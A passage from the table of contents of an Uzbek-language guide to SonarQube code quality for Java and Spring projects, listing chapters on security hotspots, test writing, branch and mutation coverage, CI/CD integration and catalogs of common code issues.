  - [16.7 Deserializatsiya va ishonchsiz ma'lumotni qayta tiklash](#167-deserializatsiya-va-ishonchsiz-malumotni-qayta-tiklash)
  - [16.8 Spring Security bilan bog'liq ogohlantirishlar: ochiq endpoint, CSRF, CORS](#168-spring-security-bilan-bogliq-ogohlantirishlar-ochiq-endpoint-csrf-cors)
  - [16.9 Loglarda maxfiy ma'lumot va foydalanuvchi kiritmasini loglash](#169-loglarda-maxfiy-malumot-va-foydalanuvchi-kiritmasini-loglash)
  - [16.10 Bog'liqliklardagi zaifliklar va ularni alohida vosita bilan tekshirish](#1610-bogliqliklardagi-zaifliklar-va-ularni-alohida-vosita-bilan-tekshirish)
  - [16.11 Hotspot ni "safe" deb belgilash: asosni qanday yozish](#1611-hotspot-ni-safe-deb-belgilash-asosni-qanday-yozish)
  - [16.12 Amalda qo'llash](#1612-amalda-qollash)

**[V. Sonar o'tadigan test](#v-sonar-otadigan-test)**

- [17. Sonar talablarini qondiradigan test yozish (Writing Tests That Satisfy Sonar)](#17-sonar-talablarini-qondiradigan-test-yozish-writing-tests-that-satisfy-sonar)
  - [17.1 Test nimani qamrashi kerak: ishlab chiqarish kodining har bir yo'li](#171-test-nimani-qamrashi-kerak-ishlab-chiqarish-kodining-har-bir-yoli)
  - [17.2 Testni qamrov uchun emas, xatti-harakat uchun yozish tamoyili](#172-testni-qamrov-uchun-emas-xatti-harakat-uchun-yozish-tamoyili)
  - [17.3 Bitta test bitta xatti-harakatni tekshirsin](#173-bitta-test-bitta-xatti-harakatni-tekshirsin)
  - [17.4 Assertion siz test: Sonar uni aniqlaydi va u foydasiz](#174-assertion-siz-test-sonar-uni-aniqlaydi-va-u-foydasiz)
  - [17.5 Istisnoni tekshirish: `assertThrows` va xabarni ham tekshirish](#175-istisnoni-tekshirish-assertthrows-va-xabarni-ham-tekshirish)
  - [17.6 Parametrik test bilan ko'p holatni kam kod bilan qoplash](#176-parametrik-test-bilan-kop-holatni-kam-kod-bilan-qoplash)
  - [17.7 Mock ni o'rinli ishlatish: nimani mock qilish, nimani qilmaslik](#177-mock-ni-orinli-ishlatish-nimani-mock-qilish-nimani-qilmaslik)
  - [17.8 Spring kontekstiga bog'liq testni kamaytirish va tezlikni saqlash](#178-spring-kontekstiga-bogliq-testni-kamaytirish-va-tezlikni-saqlash)
  - [17.9 Vaqt, tasodif va tashqi holatga bog'liq kodni sinovga ochiq qilish](#179-vaqt-tasodif-va-tashqi-holatga-bogliq-kodni-sinovga-ochiq-qilish)
  - [17.10 Testni o'qiydigan qilib yozish: nom, tuzilish, ma'lumot](#1710-testni-oqiydigan-qilib-yozish-nom-tuzilish-malumot)
  - [17.11 Qamrovni oshirish uchun yozilgan bo'sh testlarni tanib olish](#1711-qamrovni-oshirish-uchun-yozilgan-bosh-testlarni-tanib-olish)
  - [17.12 Amalda qo'llash](#1712-amalda-qollash)
- [18. Branch va shart qamrovini to'liq yopish usullari (Covering Every Branch)](#18-branch-va-shart-qamrovini-toliq-yopish-usullari-covering-every-branch)
  - [18.1 Line coverage va branch coverage farqi aniq misolda](#181-line-coverage-va-branch-coverage-farqi-aniq-misolda)
  - [18.2 Murakkab shart (`&&`, `||`) bytecode da nechta tarmoq hosil qiladi](#182-murakkab-shart---bytecode-da-nechta-tarmoq-hosil-qiladi)
  - [18.3 Qisqa tutashuv (short-circuit) va u qamrovga qanday ta'sir qiladi](#183-qisqa-tutashuv-short-circuit-va-u-qamrovga-qanday-tasir-qiladi)
  - [18.4 Har bir tarmoqni yopish uchun kerakli test holatlari jadvali](#184-har-bir-tarmoqni-yopish-uchun-kerakli-test-holatlari-jadvali)
  - [18.5 `switch` va yangi `switch` ifodasini to'liq qoplash](#185-switch-va-yangi-switch-ifodasini-toliq-qoplash)
  - [18.6 Ternar operator va `Optional` zanjiri](#186-ternar-operator-va-optional-zanjiri)
  - [18.7 Sikl ichidagi shartlar va chegaraviy qiymatlar](#187-sikl-ichidagi-shartlar-va-chegaraviy-qiymatlar)
  - [18.8 Istisno tarmog'ini yopish: mock orqali xato yuzaga keltirish](#188-istisno-tarmogini-yopish-mock-orqali-xato-yuzaga-keltirish)
  - [18.9 `finally` bloki va resurs yopilishi](#189-finally-bloki-va-resurs-yopilishi)
  - [18.10 Null tekshiruvlari: haqiqatan kerakmi yoki olib tashlash mumkinmi](#1810-null-tekshiruvlari-haqiqatan-kerakmi-yoki-olib-tashlash-mumkinmi)
  - [18.11 Shartni soddalashtirib tarmoqlar sonini kamaytirish](#1811-shartni-soddalashtirib-tarmoqlar-sonini-kamaytirish)
  - [18.12 Tuzoq va yechim](#1812-tuzoq-va-yechim)
  - [18.13 Oddiy yondashuv va arxitektor yondashuvi](#1813-oddiy-yondashuv-va-arxitektor-yondashuvi)
  - [18.14 Sonar ga tarmoq ma'lumotini uzatish](#1814-sonar-ga-tarmoq-malumotini-uzatish)
  - [18.15 Amalda qo'llash](#1815-amalda-qollash)
- [19. Testning o'zidagi Sonar qoidalari va test sifati (Sonar Rules on Test Code)](#19-testning-ozidagi-sonar-qoidalari-va-test-sifati-sonar-rules-on-test-code)
  - [19.1 Sonar test kodini ham tahlil qiladi: qaysi qoidalar unga tegishli](#191-sonar-test-kodini-ham-tahlil-qiladi-qaysi-qoidalar-unga-tegishli)
  - [19.2 Assertion siz test va u nega buzilgan hisoblanadi](#192-assertion-siz-test-va-u-nega-buzilgan-hisoblanadi)
  - [19.3 O'chirilgan yoki e'tiborsiz qoldirilgan test (`@Disabled`) va uning hisobi](#193-ochirilgan-yoki-etiborsiz-qoldirilgan-test-disabled-va-uning-hisobi)
  - [19.4 Testda `Thread.sleep` va vaqtga bog'liqlik](#194-testda-threadsleep-va-vaqtga-bogliqlik)
  - [19.5 Testda umumiy holat va testlar tartibiga bog'liqlik](#195-testda-umumiy-holat-va-testlar-tartibiga-bogliqlik)
  - [19.6 Juda ko'p mock va haddan tashqari bog'langan test](#196-juda-kop-mock-va-haddan-tashqari-boglangan-test)
  - [19.7 Test metodining nomi va uning hujjat sifatidagi roli](#197-test-metodining-nomi-va-uning-hujjat-sifatidagi-roli)
  - [19.8 Test kodidagi takrorlanish: fixture va yordamchi metodlar](#198-test-kodidagi-takrorlanish-fixture-va-yordamchi-metodlar)
  - [19.9 Testdagi magic number va tushunarsiz ma'lumot](#199-testdagi-magic-number-va-tushunarsiz-malumot)
  - [19.10 Test fayllarini Sonar uchun to'g'ri belgilash (`sonar.tests`)](#1910-test-fayllarini-sonar-uchun-togri-belgilash-sonartests)
  - [19.11 Test sifatini o'lchash: qamrov emas, nimani tekshirayotgani](#1911-test-sifatini-olchash-qamrov-emas-nimani-tekshirayotgani)
  - [19.12 Amalda qo'llash](#1912-amalda-qollash)
- [20. Mutation testing: 100% coverage qachon yolg'on (Mutation Testing)](#20-mutation-testing-100-coverage-qachon-yolgon-mutation-testing)
  - [20.1 100% coverage bilan hech narsani tekshirmaydigan test to'plami misoli](#201-100-coverage-bilan-hech-narsani-tekshirmaydigan-test-toplami-misoli)
  - [20.2 Mutation testing g'oyasi: kodga kichik o'zgarish kiritib, test sezadimi deb tekshirish](#202-mutation-testing-goyasi-kodga-kichik-ozgarish-kiritib-test-sezadimi-deb-tekshirish)
  - [20.3 Mutant turlari: shart chegarasi, qaytish qiymati, matematik amal, chaqiruvni olib tashlash](#203-mutant-turlari-shart-chegarasi-qaytish-qiymati-matematik-amal-chaqiruvni-olib-tashlash)
  - [20.4 O'ldirilgan va omon qolgan mutant, mutation score ma'nosi](#204-oldirilgan-va-omon-qolgan-mutant-mutation-score-manosi)
  - [20.5 PIT (pitest) ni Maven va Gradle da ishga tushirish](#205-pit-pitest-ni-maven-va-gradle-da-ishga-tushirish)
  - [20.6 Hisobotni o'qish: qaysi mutant omon qolgan va bu nimani bildiradi](#206-hisobotni-oqish-qaysi-mutant-omon-qolgan-va-bu-nimani-bildiradi)
  - [20.7 Omon qolgan mutantni test bilan yopish amaliyoti](#207-omon-qolgan-mutantni-test-bilan-yopish-amaliyoti)
  - [20.8 Mutation testing narxi: vaqt va uni qisqartirish usullari](#208-mutation-testing-narxi-vaqt-va-uni-qisqartirish-usullari)
  - [20.9 Qaysi modulga mutation testing qo'llash mantiqiy](#209-qaysi-modulga-mutation-testing-qollash-mantiqiy)
  - [20.10 Mutation score ni quality gate ga qo'shish masalasi](#2010-mutation-score-ni-quality-gate-ga-qoshish-masalasi)
  - [20.11 Coverage va mutation score ni birga o'qish](#2011-coverage-va-mutation-score-ni-birga-oqish)
  - [20.12 Amalda qo'llash](#2012-amalda-qollash)

**[VI. Amaliyot va jarayon](#vi-amaliyot-va-jarayon)**

- [21. CI/CD ga ulash, PR decoration va blokirovka (CI/CD Integration)](#21-cicd-ga-ulash-pr-decoration-va-blokirovka-cicd-integration)
  - [21.1 Pipeline dagi to'g'ri tartib: qurish, test, coverage hisoboti, tahlil, gate kutish](#211-pipeline-dagi-togri-tartib-qurish-test-coverage-hisoboti-tahlil-gate-kutish)
  - [21.2 GitHub Actions da sozlash: qadamlar, kesh, token saqlash](#212-github-actions-da-sozlash-qadamlar-kesh-token-saqlash)
  - [21.3 GitLab CI va Jenkins da sozlashning farqlari](#213-gitlab-ci-va-jenkins-da-sozlashning-farqlari)
  - [21.4 Pull request tahlili: qanday ulanadi va natija qayerda ko'rinadi](#214-pull-request-tahlili-qanday-ulanadi-va-natija-qayerda-korinadi)
  - [21.5 PR decoration: izohlar, holat belgisi va merge ni bloklash](#215-pr-decoration-izohlar-holat-belgisi-va-merge-ni-bloklash)
  - [21.6 `sonar.qualitygate.wait` bilan build ni to'xtatish va timeout masalasi](#216-sonarqualitygatewait-bilan-build-ni-toxtatish-va-timeout-masalasi)
  - [21.7 Token va maxfiy ma'lumotni CI da saqlash](#217-token-va-maxfiy-malumotni-ci-da-saqlash)
  - [21.8 Shallow clone muammosi va `fetch-depth` sozlash](#218-shallow-clone-muammosi-va-fetch-depth-sozlash)
  - [21.9 Fork dan kelgan PR va token yetishmasligi](#219-fork-dan-kelgan-pr-va-token-yetishmasligi)
  - [21.10 Tahlil vaqtini qisqartirish: kesh, modul tanlash, parallel ish](#2110-tahlil-vaqtini-qisqartirish-kesh-modul-tanlash-parallel-ish)
  - [21.11 Tahlil uzilganda nima qilish: qayta urinish yoki bloklashni yumshatish](#2111-tahlil-uzilganda-nima-qilish-qayta-urinish-yoki-bloklashni-yumshatish)
  - [21.12 Amalda qo'llash](#2112-amalda-qollash)
- [22. Lokal tekshirish: IDE, sonar-scanner va tez qaytish (Local Feedback Loop)](#22-lokal-tekshirish-ide-sonar-scanner-va-tez-qaytish-local-feedback-loop)
  - [22.1 Nega xatoni CI da emas, yozayotganda ko'rish arzonroq](#221-nega-xatoni-ci-da-emas-yozayotganda-korish-arzonroq)
  - [22.2 SonarLint ni IDE ga o'rnatish va ishlatish](#222-sonarlint-ni-ide-ga-ornatish-va-ishlatish)
  - [22.3 Connected mode: server profilini IDE ga tortib olish](#223-connected-mode-server-profilini-ide-ga-tortib-olish)
  - [22.4 Lokal to'liq tahlilni ishga tushirish va natijani ko'rish](#224-lokal-toliq-tahlilni-ishga-tushirish-va-natijani-korish)
  - [22.5 JaCoCo hisobotini lokal ochib, qaysi qator qamralmaganini ko'rish](#225-jacoco-hisobotini-lokal-ochib-qaysi-qator-qamralmaganini-korish)
  - [22.6 Commit oldidan tekshirish: pre-commit hook va uning chegarasi](#226-commit-oldidan-tekshirish-pre-commit-hook-va-uning-chegarasi)
  - [22.7 IDE ogohlantirishlari va Sonar natijasi mos kelmasligi sabablari](#227-ide-ogohlantirishlari-va-sonar-natijasi-mos-kelmasligi-sabablari)
  - [22.8 Tez qaytish uchun tekshiruvlarni bosqichlarga bo'lish](#228-tez-qaytish-uchun-tekshiruvlarni-bosqichlarga-bolish)
  - [22.9 Jamoada bir xil sozlama: formatlash, linter, IDE konfiguratsiyasi](#229-jamoada-bir-xil-sozlama-formatlash-linter-ide-konfiguratsiyasi)
  - [22.10 Lokal tahlilni tezlashtirish: faqat o'zgargan modulni tekshirish](#2210-lokal-tahlilni-tezlashtirish-faqat-ozgargan-modulni-tekshirish)
  - [22.11 Amalda qo'llash](#2211-amalda-qollash)
- [23. Legacy loyihani 100% ga olib chiqish rejasi (Bringing a Legacy Project to 100)](#23-legacy-loyihani-100-ga-olib-chiqish-rejasi-bringing-a-legacy-project-to-100)
  - [23.1 Birinchi tahlil: minglab issue chiqqanda vahimaga tushmaslik](#231-birinchi-tahlil-minglab-issue-chiqqanda-vahimaga-tushmaslik)
  - [23.2 Boshlang'ich holatni qayd etish va uni taqqoslash nuqtasi qilish](#232-boshlangich-holatni-qayd-etish-va-uni-taqqoslash-nuqtasi-qilish)
  - [23.3 "Clean as you code" ni birinchi kundan yoqish](#233-clean-as-you-code-ni-birinchi-kundan-yoqish)
  - [23.4 Yangi kod shartlarini darhol qattiq qo'yish, eski kodni bosqichma-bosqich tuzatish](#234-yangi-kod-shartlarini-darhol-qattiq-qoyish-eski-kodni-bosqichma-bosqich-tuzatish)
  - [23.5 Eski issue larni toifalash: tuzatish, qoldirish, qoidani o'chirish](#235-eski-issue-larni-toifalash-tuzatish-qoldirish-qoidani-ochirish)
  - [23.6 Qaysi modulni birinchi tozalash: xavf va o'zgarish tezligiga qarab](#236-qaysi-modulni-birinchi-tozalash-xavf-va-ozgarish-tezligiga-qarab)
  - [23.7 Qamrovni bosqichma-bosqich oshirish rejasi va oraliq maqsadlar](#237-qamrovni-bosqichma-bosqich-oshirish-rejasi-va-oraliq-maqsadlar)
  - [23.8 Testsiz kodga test yozish tartibi: avval xatti-harakatni qayd etish](#238-testsiz-kodga-test-yozish-tartibi-avval-xatti-harakatni-qayd-etish)
  - [23.9 Jamoani jarayonga qo'shish va vaqt ajratish masalasi](#239-jamoani-jarayonga-qoshish-va-vaqt-ajratish-masalasi)
  - [23.10 Rahbarga rejani va kutilayotgan natijani tushuntirish](#2310-rahbarga-rejani-va-kutilayotgan-natijani-tushuntirish)
  - [23.11 Muvaffaqiyat o'lchovi: issue soni emas, nimani o'lchash kerak](#2311-muvaffaqiyat-olchovi-issue-soni-emas-nimani-olchash-kerak)
  - [23.12 Bir yillik real jadval namunasi](#2312-bir-yillik-real-jadval-namunasi)
  - [23.13 Amalda qo'llash](#2313-amalda-qollash)
- [24. False positive, suppression va o'z qoidangiz (False Positives and Custom Rules)](#24-false-positive-suppression-va-oz-qoidangiz-false-positives-and-custom-rules)
  - [24.1 False positive nima va u qanchalik tez-tez uchraydi](#241-false-positive-nima-va-u-qanchalik-tez-tez-uchraydi)
  - [24.2 Issue ni "false positive" yoki "won't fix" deb belgilash va farqi](#242-issue-ni-false-positive-yoki-wont-fix-deb-belgilash-va-farqi)
  - [24.3 Belgilashni asoslash: izoh yozish majburiyati](#243-belgilashni-asoslash-izoh-yozish-majburiyati)
  - [24.4 Kod ichida bostirish: `@SuppressWarnings` va uning ta'sir doirasi](#244-kod-ichida-bostirish-suppresswarnings-va-uning-tasir-doirasi)
  - [24.5 Bostirishni ko'rib chiqish: ular to'planib qolmasligi uchun tartib](#245-bostirishni-korib-chiqish-ular-toplanib-qolmasligi-uchun-tartib)
  - [24.6 Qoidani butunlay o'chirish qachon to'g'ri qaror](#246-qoidani-butunlay-ochirish-qachon-togri-qaror)
  - [24.7 O'z qoidangizni yozish: qachon zarur bo'ladi](#247-oz-qoidangizni-yozish-qachon-zarur-boladi)
  - [24.8 Qoida yozishning muqobillari: ArchUnit, linter, code review qoidasi](#248-qoida-yozishning-muqobillari-archunit-linter-code-review-qoidasi)
  - [24.9 Jamoaviy kelishuv: kim belgilaydi, kim tasdiqlaydi](#249-jamoaviy-kelishuv-kim-belgilaydi-kim-tasdiqlaydi)
  - [24.10 Suppression statistikasini kuzatish va ularni kamaytirish](#2410-suppression-statistikasini-kuzatish-va-ularni-kamaytirish)
  - [24.11 Sonar charchog'i: belgilar ko'payib ketganda nima qilish](#2411-sonar-charchogi-belgilar-kopayib-ketganda-nima-qilish)
  - [24.12 Amalda qo'llash](#2412-amalda-qollash)

**[VII. Xato katalogi: qanday kod qanday xato hisoblanadi](#vii-xato-katalogi-qanday-kod-qanday-xato-hisoblanadi)**

- [25. Xato katalogi: reliability (bug) toifasi (Catalog: Reliability)](#25-xato-katalogi-reliability-bug-toifasi-catalog-reliability)
  - [25.1 Toifa va jiddiylik qanday o'qiladi](#251-toifa-va-jiddiylik-qanday-oqiladi)
  - [25.2 null bo'lishi mumkin bo'lgan qiymatga murojaat qilish](#252-null-bolishi-mumkin-bolgan-qiymatga-murojaat-qilish)
  - [25.3 Optional ni tekshirmasdan get() chaqirish](#253-optional-ni-tekshirmasdan-get-chaqirish)
  - [25.4 Yopilmagan resurs: InputStream, Connection, Statement](#254-yopilmagan-resurs-inputstream-connection-statement)
  - [25.5 equals va hashCode ni birgalikda yozmaslik](#255-equals-va-hashcode-ni-birgalikda-yozmaslik)
  - [25.6 Boxed turlarni == bilan solishtirish](#256-boxed-turlarni--bilan-solishtirish)
  - [25.7 Suzuvchi nuqtali sonlarni == bilan solishtirish va pul uchun double](#257-suzuvchi-nuqtali-sonlarni--bilan-solishtirish-va-pul-uchun-double)
  - [25.8 Metod natijasini e'tiborsiz qoldirish](#258-metod-natijasini-etiborsiz-qoldirish)
  - [25.9 InterruptedException ni yutib yuborish](#259-interruptedexception-ni-yutib-yuborish)
  - [25.10 Har doim bir xil natija beradigan shart va yetib bo'lmaydigan kod](#2510-har-doim-bir-xil-natija-beradigan-shart-va-yetib-bolmaydigan-kod)
  - [25.11 To'plamni iteratsiya paytida o'zgartirish](#2511-toplamni-iteratsiya-paytida-ozgartirish)
  - [25.12 Collectors.toMap da takroriy kalit](#2512-collectorstomap-da-takroriy-kalit)
  - [25.13 Sanani noto'g'ri formatlash va SimpleDateFormat ni baham ko'rish](#2513-sanani-notogri-formatlash-va-simpledateformat-ni-baham-korish)
  - [25.14 compareTo va equals nomuvofiqligi](#2514-compareto-va-equals-nomuvofiqligi)
  - [25.15 Sikl o'zgaruvchisini ichkarida o'zgartirish yoki cheksiz sikl xavfi](#2515-sikl-ozgaruvchisini-ichkarida-ozgartirish-yoki-cheksiz-sikl-xavfi)
  - [25.16 Tuzoq va yechim](#2516-tuzoq-va-yechim)
  - [25.17 Oddiy yondashuv va arxitektor yondashuvi](#2517-oddiy-yondashuv-va-arxitektor-yondashuvi)
  - [25.18 Katalogni loyihada tekshirish](#2518-katalogni-loyihada-tekshirish)
  - [25.19 Amalda qo'llash](#2519-amalda-qollash)
- [26. Xato katalogi: security (vulnerability va hotspot) (Catalog: Security)](#26-xato-katalogi-security-vulnerability-va-hotspot-catalog-security)
  - [26.1 SQL ni satr birlashtirish bilan qurish](#261-sql-ni-satr-birlashtirish-bilan-qurish)
  - [26.2 JPQL va native query da kiritmani bevosita qo'yish](#262-jpql-va-native-query-da-kiritmani-bevosita-qoyish)
  - [26.3 Kodda qattiq yozilgan parol, token yoki API kalit](#263-kodda-qattiq-yozilgan-parol-token-yoki-api-kalit)
  - [26.4 Zaif hash algoritmi bilan parol saqlash](#264-zaif-hash-algoritmi-bilan-parol-saqlash)
  - [26.5 Random ni xavfsizlik uchun ishlatish](#265-random-ni-xavfsizlik-uchun-ishlatish)
  - [26.6 Fayl yo'lini foydalanuvchi kiritmasidan qurish](#266-fayl-yolini-foydalanuvchi-kiritmasidan-qurish)
  - [26.7 Tashqi buyruq bajarish va argumentlarni tekshirmaslik](#267-tashqi-buyruq-bajarish-va-argumentlarni-tekshirmaslik)
  - [26.8 Ishonchsiz manbadan deserializatsiya](#268-ishonchsiz-manbadan-deserializatsiya)
  - [26.9 Loglarda maxfiy ma'lumot yoki kiritmani yozish](#269-loglarda-maxfiy-malumot-yoki-kiritmani-yozish)
  - [26.10 Spring Security da endpoint ochiq qolishi](#2610-spring-security-da-endpoint-ochiq-qolishi)
  - [26.11 CSRF yoki CORS ni asossiz o'chirish](#2611-csrf-yoki-cors-ni-asossiz-ochirish)
  - [26.12 TLS sertifikat tekshiruvini o'chirib qo'yish](#2612-tls-sertifikat-tekshiruvini-ochirib-qoyish)
  - [26.13 XML va XXE xavfi](#2613-xml-va-xxe-xavfi)
  - [26.14 Istisno matnini foydalanuvchiga to'liq qaytarish](#2614-istisno-matnini-foydalanuvchiga-toliq-qaytarish)
  - [26.15 Oddiy yondashuv va arxitektor yondashuvi](#2615-oddiy-yondashuv-va-arxitektor-yondashuvi)
  - [26.16 Tuzoq va yechim](#2616-tuzoq-va-yechim)
  - [26.17 Amalda qo'llash](#2617-amalda-qollash)
- [27. Xato katalogi: maintainability, tuzilish va murakkablik (Catalog: Maintainability, Structure)](#27-xato-katalogi-maintainability-tuzilish-va-murakkablik-catalog-maintainability-structure)
  - [27.1 Cognitive complexity chegarasidan oshgan metod](#271-cognitive-complexity-chegarasidan-oshgan-metod)
  - [27.2 Juda uzun metod va juda uzun klass](#272-juda-uzun-metod-va-juda-uzun-klass)
  - [27.3 Parametrlar soni ko'p metod](#273-parametrlar-soni-kop-metod)
  - [27.4 Ichma-ich joylashgan shartlar va chuqur bloklar](#274-ichma-ich-joylashgan-shartlar-va-chuqur-bloklar)
  - [27.5 Birlashtirish mumkin bo'lgan ketma-ket `if` lar](#275-birlashtirish-mumkin-bolgan-ketma-ket-if-lar)
  - [27.6 Bo'sh blok va bo'sh `catch`](#276-bosh-blok-va-bosh-catch)
  - [27.7 Takrorlangan kod bloki](#277-takrorlangan-kod-bloki)
  - [27.8 Takrorlangan satr literali](#278-takrorlangan-satr-literali)
  - [27.9 Magic number va uni konstantaga chiqarish](#279-magic-number-va-uni-konstantaga-chiqarish)
  - [27.10 Ortiqcha mahalliy o'zgaruvchi va darhol qaytariladigan qiymat](#2710-ortiqcha-mahalliy-ozgaruvchi-va-darhol-qaytariladigan-qiymat)
  - [27.11 Keraksiz `else` va erta qaytish bilan soddalashtirish](#2711-keraksiz-else-va-erta-qaytish-bilan-soddalashtirish)
  - [27.12 Ternar operatorlarni ichma-ich joylash](#2712-ternar-operatorlarni-ichma-ich-joylash)
  - [27.13 `switch` da `default` yo'qligi va qamrab olinmagan holat](#2713-switch-da-default-yoqligi-va-qamrab-olinmagan-holat)
  - [27.14 Umumiy `Exception` ni ushlash yoki tashlash](#2714-umumiy-exception-ni-ushlash-yoki-tashlash)
  - [27.15 Oddiy yondashuv va arxitektor yondashuvi](#2715-oddiy-yondashuv-va-arxitektor-yondashuvi)
  - [27.16 Tuzoq va yechim](#2716-tuzoq-va-yechim)
  - [27.17 Amalda qo'llash](#2717-amalda-qollash)
- [28. Xato katalogi: maintainability, nomlash, o'lik kod va uslub (Catalog: Maintainability, Naming)](#28-xato-katalogi-maintainability-nomlash-olik-kod-va-uslub-catalog-maintainability-naming)
  - [28.1 Nomlash shabloniga mos kelmaydigan klass, metod, maydon va konstanta](#281-nomlash-shabloniga-mos-kelmaydigan-klass-metod-maydon-va-konstanta)
  - [28.2 Bitta harfli va ma'nosiz nomlar](#282-bitta-harfli-va-manosiz-nomlar)
  - [28.3 Ishlatilmaydigan import, maydon, parametr va mahalliy o'zgaruvchi](#283-ishlatilmaydigan-import-maydon-parametr-va-mahalliy-ozgaruvchi)
  - [28.4 Ishlatilmaydigan private metod va o'lik kod](#284-ishlatilmaydigan-private-metod-va-olik-kod)
  - [28.5 Kommentariyaga olingan kod bloki](#285-kommentariyaga-olingan-kod-bloki)
  - [28.6 `TODO` va `FIXME` izohlari va ularning hisobi](#286-todo-va-fixme-izohlari-va-ularning-hisobi)
  - [28.7 Eskirgan (deprecated) API ishlatish](#287-eskirgan-deprecated-api-ishlatish)
  - [28.8 `public` maydon va kapsullashning buzilishi](#288-public-maydon-va-kapsullashning-buzilishi)
  - [28.9 `final` qo'yilmagan o'zgarmas maydon](#289-final-qoyilmagan-ozgarmas-maydon)
  - [28.10 Ortiqcha modifikator (interfeysda `public abstract`)](#2810-ortiqcha-modifikator-interfeysda-public-abstract)
  - [28.11 Satr birlashtirishni sikl ichida bajarish](#2811-satr-birlashtirishni-sikl-ichida-bajarish)
  - [28.12 Loglashda satr birlashtirish va formatlangan xabarga o'tish](#2812-loglashda-satr-birlashtirish-va-formatlangan-xabarga-otish)
  - [28.13 Ortiqcha `toString` va `String.valueOf` chaqiruvi](#2813-ortiqcha-tostring-va-stringvalueof-chaqiruvi)
  - [28.14 Bir xil ishni bajaradigan ikkita metod](#2814-bir-xil-ishni-bajaradigan-ikkita-metod)
  - [28.15 Oddiy yondashuv va arxitektor yondashuvi](#2815-oddiy-yondashuv-va-arxitektor-yondashuvi)
  - [28.16 Tuzoqlar va yechimlar](#2816-tuzoqlar-va-yechimlar)
  - [28.17 Amalda qo'llash](#2817-amalda-qollash)
- [29. Xato katalogi: Spring, JPA va PostgreSQL ga xos xatolar (Catalog: Spring, JPA and PostgreSQL)](#29-xato-katalogi-spring-jpa-va-postgresql-ga-xos-xatolar-catalog-spring-jpa-and-postgresql)
  - [29.1 Maydonga `@Autowired` qo'yish](#291-maydonga-autowired-qoyish)
  - [29.2 Singleton bean ichida o'zgaruvchan holat saqlash](#292-singleton-bean-ichida-ozgaruvchan-holat-saqlash)
  - [29.3 `@Transactional` ni `private` yoki ichki chaqiriladigan metodga qo'yish](#293-transactional-ni-private-yoki-ichki-chaqiriladigan-metodga-qoyish)
  - [29.4 Controller da biznes mantiq va uni servisga ko'chirish](#294-controller-da-biznes-mantiq-va-uni-servisga-kochirish)
  - [29.5 Entity ni to'g'ridan-to'g'ri API javobida qaytarish](#295-entity-ni-togridan-togri-api-javobida-qaytarish)
  - [29.6 Entity da `equals` va `hashCode` ni noto'g'ri yozish](#296-entity-da-equals-va-hashcode-ni-notogri-yozish)
  - [29.7 `@OneToMany` da `FetchType.EAGER` va N+1 xavfi](#297-onetomany-da-fetchtypeeager-va-n1-xavfi)
  - [29.8 Repository metodida barcha qatorlarni olish va sahifalashsiz ishlash](#298-repository-metodida-barcha-qatorlarni-olish-va-sahifalashsiz-ishlash)
  - [29.9 Native query da satr birlashtirish](#299-native-query-da-satr-birlashtirish)
  - [29.10 `@Value` bilan maxfiy ma'lumotni standart qiymat sifatida yozish](#2910-value-bilan-maxfiy-malumotni-standart-qiymat-sifatida-yozish)
  - [29.11 Konfiguratsiyada parol va kalitni ochiq saqlash](#2911-konfiguratsiyada-parol-va-kalitni-ochiq-saqlash)
  - [29.12 Katta `@Configuration` klassi va ortiqcha bean](#2912-katta-configuration-klassi-va-ortiqcha-bean)
  - [29.13 Istisnolarni controller da umumiy ushlash va ma'lumotni oshkor qilish](#2913-istisnolarni-controller-da-umumiy-ushlash-va-malumotni-oshkor-qilish)
  - [29.14 `RestTemplate` yoki `WebClient` ni timeout siz ishlatish](#2914-resttemplate-yoki-webclient-ni-timeout-siz-ishlatish)
  - [29.15 Oddiy yondashuv va arxitektor yondashuvi](#2915-oddiy-yondashuv-va-arxitektor-yondashuvi)
  - [29.16 Tuzoq va yechim](#2916-tuzoq-va-yechim)
  - [29.17 Amalda qo'llash](#2917-amalda-qollash)
- [30. Xato katalogi: test kodidagi xatolar (Catalog: Test Code)](#30-xato-katalogi-test-kodidagi-xatolar-catalog-test-code)
  - [30.1 Assertion siz test metodi](#301-assertion-siz-test-metodi)
  - [30.2 Istisnoni try-catch bilan tekshirish va assertThrows ga o'tish](#302-istisnoni-try-catch-bilan-tekshirish-va-assertthrows-ga-otish)
  - [30.3 Juda keng qamrovli assertThrows bloki](#303-juda-keng-qamrovli-assertthrows-bloki)
  - [30.4 @Disabled qoldirilgan test va sababsiz o'chirish](#304-disabled-qoldirilgan-test-va-sababsiz-ochirish)
  - [30.5 Thread.sleep bilan kutish va uni almashtirish](#305-threadsleep-bilan-kutish-va-uni-almashtirish)
  - [30.6 Testlar orasida umumiy o'zgaruvchan holat](#306-testlar-orasida-umumiy-ozgaruvchan-holat)
  - [30.7 Test metodining ma'nosiz nomi](#307-test-metodining-manosiz-nomi)
  - [30.8 Testda magic number va tushunarsiz ma'lumot](#308-testda-magic-number-va-tushunarsiz-malumot)
  - [30.9 Takrorlangan tayyorlash kodi va uni yagona joyga chiqarish](#309-takrorlangan-tayyorlash-kodi-va-uni-yagona-joyga-chiqarish)
  - [30.10 Bir testda juda ko'p assertion va aralash maqsad](#3010-bir-testda-juda-kop-assertion-va-aralash-maqsad)
  - [30.11 Test klassida test metodi yo'qligi](#3011-test-klassida-test-metodi-yoqligi)
  - [30.12 Faqat qamrov uchun yozilgan, natijani tekshirmaydigan test](#3012-faqat-qamrov-uchun-yozilgan-natijani-tekshirmaydigan-test)
  - [30.13 Oddiy yondashuv va arxitektor yondashuvi](#3013-oddiy-yondashuv-va-arxitektor-yondashuvi)
  - [30.14 Tuzoq va yechim](#3014-tuzoq-va-yechim)
  - [30.15 Amalda qo'llash](#3015-amalda-qollash)
- [31. Xatolarga tushmaslik uchun yakuniy tavsiyalar (Preventive Checklist)](#31-xatolarga-tushmaslik-uchun-yakuniy-tavsiyalar-preventive-checklist)
  - [31.1 Kod yozishdan oldin: metod kichik, nom aniq, shart sodda bo'lsin degan odat](#311-kod-yozishdan-oldin-metod-kichik-nom-aniq-shart-sodda-bolsin-degan-odat)
  - [31.2 Reliability toifasiga tushmaslik uchun kundalik qoidalar ro'yxati](#312-reliability-toifasiga-tushmaslik-uchun-kundalik-qoidalar-royxati)
  - [31.3 Security toifasiga tushmaslik uchun kundalik qoidalar ro'yxati](#313-security-toifasiga-tushmaslik-uchun-kundalik-qoidalar-royxati)
  - [31.4 Maintainability toifasiga tushmaslik uchun kundalik qoidalar ro'yxati](#314-maintainability-toifasiga-tushmaslik-uchun-kundalik-qoidalar-royxati)
